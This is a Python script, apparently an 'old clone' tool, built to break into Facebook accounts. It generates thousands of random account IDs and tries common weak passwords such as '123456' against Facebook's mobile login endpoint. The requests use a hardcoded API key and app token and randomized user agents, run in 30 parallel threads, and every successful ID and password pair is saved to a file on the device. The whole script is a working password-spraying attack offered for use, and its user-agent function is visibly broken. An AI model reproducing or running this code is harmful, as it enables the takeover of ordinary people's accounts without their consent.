#[===================MODULE======================]#
import os,sys,uuid,requests,time
from concurrent.futures import ThreadPoolExecutor as ArAfat
from os import system as axp
from random import randint as aRaft
from random import choice as race
from string import digits as digits
#[===================COLORS======================]#
R = '\033[1;91m';W = '\033[1;97m';G = '\033[1;32m';Y = '\033[1;33m';B = '\x1b[38;5;46m';xd = f"{W}({R}×{W})";x = f"{W}({R}1{W})";y = f"{W}({R}2{W})";os.system("clear")
#[===================LOOP======================]#
loop, ok = 0, 0
user = []
#[===================LOGO======================]#
logo = (f"""
""")
#[===================CLEAR======================]#
def clear():
    axp("clear")
    print(logo)
#[===================ANIMATION======================]#
def animation(u):
    for e in u + "\n":
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.01)
#[===================LINE======================]#
def linex():
    animation(f"\033[1;37m=====================================================\x1b[1;97m")
#[===================UA-BOX======================]#
def ua():
    return "Mozilla/5.0 (Wi    ndows NT 10.0; {str(rr(9,11))}; Win64; x64){str(aZ)}{str(rx)}{str(aZ)}) AppleWebKit/537.36 (KHTML, like Gecko){str(rr(99,149))}.0.{str(rr(4500,4999))}.{str(rr(35,99))} Chrome/{str(rr(99,175))}.0.{str(rr(0,5))}.{str(rr(0,5))} Safari/537.36" 
#[===================MAIN-MENU======================]#
def main():
    clear()
    print(f"\033[1;37m❨\033[1;31m𝝣\033[1;37m❩\033[1;32m OLD CLONE 2009-2014\n\033[1;37m❨\033[1;31m𝝣\033[1;37m❩\033[1;31m EXIT")
    linex()
    frsc = input(f"\033[1;37m❨\033[1;31m𝝣\033[1;37m❩\033[1;32m CHOICE : ")
    if frsc == "1":
        settings()
    if frsc == "2":
        clear()
        print("\033[1;37m❨\033[1;31m𝝣\033[1;37m❩\033[1;32m TOOLS EXIT ✅")
        os.system("exit")
    else:
        os.system("python ARAXD-OLD.py")
#[===================SETTING'S======================]#
def settings():
    animation(f"\033[1;37m❨\033[1;31m𝝣\033[1;37m❩\033[1;32m EXAMPLE \033[1;35m❯ \033[1;32m 10000 / 20000 / 30000 / 40000")
    linex()
    limit = int(input(f"\033[1;37m❨\033[1;31m𝝣\033[1;37m❩\033[1;32m ENTER  LIMIT \033[1;35m❯ \033[1;32m"))
    for _ in range(limit):
        arf = ''.join(race(digits) for _ in range(10))
        user.append(arf)    
    with ArAfat(max_workers=30) as ablxXudina:
        total = str(len(user))
        clear()
        animation(f"\033[1;37m❨\033[1;31m𝝣\033[1;37m❩\033[1;32m TOTAL LIMIT \033[1;35m❯ \033[1;32m%s" % (total))
        animation(f"\033[1;37m❨\033[1;31m𝝣\033[1;37m❩\033[1;32m IF YOU GET NO RESULTS USE 1.1.1.1 VPN")
        linex()
        for xd in user:
            uid = str("10000" + xd)
            pas = ['123456789','123456','12345678','1234567']
            ablxXudina.submit(FBOLDIDSFUCKER, uid, pas, total)    
    print()
    linex()
    print(f"\033[1;37m❨\033[1;31m𝝣\033[1;37m❩\033[1;32m PROCESS COMPLETE \n\033[1;37m❨\033[1;31m𝝣\033[1;37m❩\033[1;32m TOTAL OK \033[1;35m❯ \033[1;32m%s" % (ok))
    linex()
    input(f"\033[1;37m❨\033[1;31m𝝣\033[1;37m❩\033[1;32m ENTER TO GET MENU ")
    exit()
#[===================LOGO======================]#
def FBOLDIDSFUCKER(uid, pas, tl):
    global loop, ok
    sys.stdout.write(f"\r\r\033[1;37m❨\033[1;31m𝝣\033[1;37m❩\033[1;32m [ARAFAT-OLD] \033[1;37m❨\033[1;31m𝝣\033[1;37m❩\033[1;32m %s \033[1;37m❨\033[1;31m𝝣\033[1;37m❩\033[1;32m OK \033[1;37m❨\033[1;31m𝝣\033[1;37m❩\033[1;32m %s "%(loop,ok))
    sys.stdout.flush()    
    try:
        for ps in pas:
            with requests.Session() as session:
                data = {
                    'adid': str(uuid.uuid4()),
                    'email': uid,
                    'password': ps,
                    'cpl': 'true',
                    'credentials_type': 'device_based_login_password',
                    'source': 'device_based_login',
                    'error_detail_type': 'button_with_disabled',
                    'format': 'json',
                    'generate_session_cookies': '1',
                    'generate_analytics_claim': '1',
                    'generate_machine_id': '1',
                    "family_device_id": str(uuid.uuid4()),
                    "advertiser_id": str(uuid.uuid4()),
                    "locale": "en_US",
                    "client_country_code": "US",
                    "device_id": str(uuid.uuid4()),
                    "method": "auth.login",
                    "api_key": "882a8490361da98702bf97a021ddc14d",
                    "fb_api_req_friendly_name": "authenticate",
                    "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler"
                }
                head = {
                    'content-type': 'application/x-www-form-urlencoded',
                    'Host': 'graph.facebook.com',
                    'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                    'user-agent': ua(),
                    'accept-encoding': 'gzip, deflate',
                    'x-fb-http-engine': 'Liger'
                }
                url = "https://b-api.facebook.com/auth/login"
                response = session.post(url, data=data, headers=head, verify=True).json()
                if "access_token" in response:
                    print(f"\n\033[1;32m[OK] {uid} • {ps}")
                    open("/sdcard/ccc.txt", "a").write(uid + "|" + ps + "\n")
                    ok += 1
                    break
                elif "www.facebook.com" in response.get("error", {}).get("message", ""):
                    print(f"\n\033[1;32m[OK] {uid} • {ps}")
                    open("/sdcard/ccc.txt", "a").write(uid + "|" + ps + "\n")
                    break
        loop += 1
    except Exception as e:
        pass
main()
